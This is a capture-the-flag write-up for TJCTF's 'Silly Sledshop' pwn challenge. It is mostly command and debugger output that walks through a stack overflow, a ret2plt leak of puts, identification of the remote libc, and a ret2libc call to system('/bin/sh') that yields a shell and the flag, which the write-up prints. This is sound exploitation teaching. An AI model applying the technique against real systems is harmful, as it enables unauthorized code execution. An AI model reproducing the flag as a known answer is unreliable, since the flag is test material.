# Silly Sledshop
Binary

## Challenge 

Omkar really wants to experience Arctic dogsledding. Unfortunately, the [sledshop](443fc1af632011028063e52ee67e68447bf8764e29d0f24ecf388c2e69e57522_sledshop) ([source](ae4e16b219a11bbdadcd1a3bab7ecd63dd31221136f8b749f76ee9497e900b46_sledshop.c)) he has come across is being very uncooperative. How pitiful.

Lesson: nothing stops Omkar.

He will go sledding whenever and wherever he wants.

nc p1.tjctf.org 8010

## Solution

Fuzz for offset

	# pwn cyclic 100 | strace ./sledshop
	# pwn cyclic -l 0x61616175
	80

Hinted from the title, I thought we must return to the heap buffer and use NOP sleds.

There are no useful ROP gadgets

	$  ROPgadget --binary *_sledshop --only "jmp"
	Gadgets information
	============================================================
	0x080487ef : jmp eax

	Unique gadgets found: 1
	
	$  ROPgadget --binary *_sledshop --only "call"
	Gadgets information
	============================================================
	0x08048378 : call 0x8048466
	0x08048493 : call eax
	0x080484cd : call edx

The heap address is also randomised

	# pwn cyclic 300 > input.txt
	# gdb ./sledshop
	(gdb) run < input.txt 

	Program received signal SIGSEGV, Segmentation fault.
	0x61616175 in ?? ()
	(gdb) x/20x $sp 
	0xffffdd10:	0x61616176	0x61616177	0x61616178	0x61616179
	0xffffdd20:	0x6261617a	0x62616162	0x62616163	0x62616164
	0xffffdd30:	0x62616165	0x62616166	0x62616167	0x62616168
	0xffffdd40:	0x62616169	0x6261616a	0x6261616b	0x6261616c
	0xffffdd50:	0x6261616d	0x6261616e	0x6261616f	0x62616170
	(gdb) x/20x $sp-100
	0xffffdcac:	0xf7e56fbb	0xf7fc5d80	0x0000000a	0x00000011
	0xffffdcbc:	0x61616161	0x61616162	0x61616163	0x61616164
	0xffffdccc:	0x61616165	0x61616166	0x61616167	0x61616168
	0xffffdcdc:	0x61616169	0x6161616a	0x6161616b	0x6161616c
	0xffffdcec:	0x6161616d	0x6161616e	0x6161616f	0x61616170
	(gdb) quit


I thought of leaking address of LIBC. Bruteforcing will work since this is 32-bits, but I noticed we have access to puts() in PLT and GOT table. 

Here are some reading resources:
- https://tc.gtisc.gatech.edu/cs6265/2016/l/lab07-rop/README-tut.txt
- https://hackinhat.today/howto/rop-in-64/
- https://nandynarwhals.org/ret2libc-namedpipes/
- https://github.com/zst-ctf/encryptctf-2019-writeups/tree/master/Unsolved/pwn2
- https://forum.hackthebox.eu/discussion/161/bof-and-aslr
- https://stackoverflow.com/a/18272027

We can do ret2plt (Procedure Linkage Table) to get the address of puts(). Then, using offsets of libc, we can calculate the base address. Out goal is to call `system('/bin/sh'); exit()`.

### ret2plt attack

Find offsets for local machine

	# ldd --version
	ldd (Debian GLIBC 2.27-4) 2.27

	# readelf -s /lib32/libc.so.6 | grep system
	   254: 00127dd0   102 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr@@GLIBC_2.0
	   652: 0003d7e0    55 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE
	  1510: 0003d7e0    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0

	# readelf -s /lib32/libc.so.6 | grep puts  
	212: 00067e30   474 FUNC    GLOBAL DEFAULT   13 _IO_puts@@GLIBC_2.0

	# readelf -s /lib32/libc.so.6 | grep exit  
	147: 00030a30    33 FUNC    GLOBAL DEFAULT   13 exit@@GLIBC_2.0

	# strings -a -t x /lib32/libc.so.6 | grep /bin/sh
	 17c968 /bin/sh


Work locally, but doing on the server, does not work.

	# python exploit.py
	[+] Opening connection to p1.tjctf.org on port 8010: Done
	The following products are available:

	|  Saucer  | $1 |
	| Kicksled | $2 |
	| Airboard | $3 |
	| Toboggan | $4 |
	Which product would you like?
	Sorry, we are closed.

	('Leaked puts@libc:', '0xf7e73140')
	('Found libc base:', '0xf7dde310')

The libc base is not correct. We need to find libc version

Use https://libc.blukat.me/ to search

	Query: puts
	Offset: 140

This gives us [the result](https://libc.blukat.me/?q=puts%3A140&l=libc6-i386_2.23-0ubuntu11_amd64
)

	libc6-i386_2.23-0ubuntu10_amd64
	libc6-i386_2.23-0ubuntu11_amd64

The symbols are at as follows

	# https://libc.blukat.me/d/libc6-i386_2.23-0ubuntu11_amd64.symbols
	puts 0005f140
	system 0003a940
	exit 0002e7b0
	str_bin_sh 15902b

Final exploit

	# python exploit.py
	[+] Opening connection to p1.tjctf.org on port 8010: Done
	The following products are available:

	|  Saucer  | $1 |
	| Kicksled | $2 |
	| Airboard | $3 |
	| Toboggan | $4 |
	Which product would you like?
	Sorry, we are closed.

	('Leaked puts@libc:', '0xf7e73140')
	('Found libc base:', '0xf7e14000')
	@????C??
	The following products are available:
	|  Saucer  | $1 |
	| Kicksled | $2 |
	| Airboard | $3 |
	| Toboggan | $4 |
	Which product would you like?

	[*] Switching to interactive mode
	Sorry, we are closed.
	total 36
	dr-xr-xr-x 1 app  app  4096 Apr  5 21:30 .
	drwxr-xr-x 1 root root 4096 Apr  5 21:30 ..
	-r--r--r-- 1 app  app   220 Aug 31  2015 .bash_logout
	-r--r--r-- 1 app  app  3771 Aug 31  2015 .bashrc
	-r--r--r-- 1 app  app   655 May 16  2017 .profile
	-r-xr-xr-x 1 root root   36 Apr  5 21:29 flag.txt
	-r-xr-xr-x 1 root root 7656 Apr  5 21:29 sledshop
	-r-xr-xr-x 1 root root   70 Apr  5 21:29 wrapper
	$ cat flag.txt
	tjctf{5l3dd1n6_0mk4r_15_h4ppy_0mk4r}

## Flag

	tjctf{5l3dd1n6_0mk4r_15_h4ppy_0mk4r}
